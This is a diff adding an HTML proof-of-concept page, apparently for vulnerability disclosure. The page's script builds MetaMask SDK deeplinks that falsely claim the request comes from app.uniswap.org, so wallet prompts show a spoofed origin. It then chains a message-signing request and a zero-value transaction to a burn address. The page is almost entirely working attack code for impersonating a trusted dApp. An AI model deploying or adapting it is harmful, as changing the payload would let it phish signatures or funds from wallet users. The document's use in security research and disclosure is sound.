@@ -1,0 +1,106 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>MetaMask SDK Origin Spoof PoC</title>
+  <style>
+    body {
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      margin: 24px;
+      line-height: 1.45;
+    }
+    button {
+      display: block;
+      margin: 10px 0;
+      padding: 10px 14px;
+      border: 1px solid #333;
+      border-radius: 6px;
+      background: #fff;
+      color: #111;
+      font: inherit;
+    }
+    pre {
+      margin-top: 16px;
+      padding: 12px;
+      border: 1px solid #aaa;
+      border-radius: 6px;
+      white-space: pre-wrap;
+      word-break: break-word;
+    }
+  </style>
+</head>
+<body>
+  <h1>MetaMask SDK Origin Spoof PoC</h1>
+  <button id="connect">Spoof connect prompt</button>
+  <button id="sign">connect + personal_sign</button>
+  <button id="send">connect + eth_sendTransaction</button>
+
+
+  <script>
+    const REAL_ORIGIN = location.origin;
+    const CLAIMED_URL = 'https://app.uniswap.org';
+    const CLAIMED_TITLE = 'Uniswap';
+    const DEAD = '0x000000000000000000000000000000000000dEaD';
+
+    function b64Json(value) {
+      return btoa(unescape(encodeURIComponent(JSON.stringify(value))));
+    }
+
+    function hexUtf8(value) {
+      return '0x' + Array.from(new TextEncoder().encode(value))
+        .map((byte) => byte.toString(16).padStart(2, '0'))
+        .join('');
+    }
+
+    function openSpoof(request) {
+      const channelId = CLAIMED_URL;
+      const originatorInfo = b64Json({
+        originatorInfo: {
+          url: CLAIMED_URL,
+          title: CLAIMED_TITLE,
+          platform: 'web',
+          dappId: 'origin-spoof-poc'
+        }
+      });
+
+      let url =
+        'metamask://connect' +
+        `?channelId=${encodeURIComponent(channelId)}` +
+        '&comm=deeplinking' +
+        '&scheme=originspoofpoc' +
+        '&pubkey=02aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' +
+        `&originatorInfo=${encodeURIComponent(originatorInfo)}`;
+
+      if (request) {
+        url += `&request=${encodeURIComponent(JSON.stringify(request))}`;
+      }
+
+      location.href = url;
+    }
+
+    document.getElementById('connect').onclick = () => openSpoof();
+
+    document.getElementById('sign').onclick = () => openSpoof({
+      id: String(Date.now()),
+      method: 'metamask_connectSign',
+      params: [
+        hexUtf8(`Origin spoof PoC triggered from ${REAL_ORIGIN}`)
+      ]
+    });
+
+    document.getElementById('send').onclick = () => openSpoof({
+      id: String(Date.now()),
+      method: 'metamask_connectWith',
+      params: [{
+        method: 'eth_sendTransaction',
+        params: [{
+          to: DEAD,
+          value: '0x0',
+          data: '0x'
+        }]
+      }]
+    });
+  </script>
+</body>
+</html>
